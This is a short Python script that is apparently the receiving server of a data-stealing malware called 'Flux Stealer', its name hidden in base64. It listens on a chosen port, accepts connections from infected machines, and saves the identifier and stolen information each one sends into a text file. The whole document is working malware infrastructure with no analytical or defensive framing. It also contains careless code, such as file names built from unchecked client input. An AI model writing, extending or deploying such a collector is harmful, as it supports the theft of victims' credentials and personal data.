import socket
import base64
import threading

print("Welcome To "+str(base64.b64decode(b'Rmx1eCBTdGVhbGVy'.decode()).decode()))
lol = socket.socket()
port = input("Port: ")
lol.bind(('0.0.0.0',int(port)))
print("Waiting For People")
import random
def handle_clients():
    while True:
        lol.listen(1029)
        client, addr = lol.accept()
        print("New Client Connected... Reciving Info")
        axx = client.recv(9023148555).decode()+"-"
        xax = client.recv(985614851).decode()
        with open(axx+str(random.randint(1,49193122))+".txt","w") as file:
            file.write("Flux Stealer V1.0\n"+xax)
            print("Saved To "+file.name)


threading.Thread(target=handle_clients,daemon=False).start()
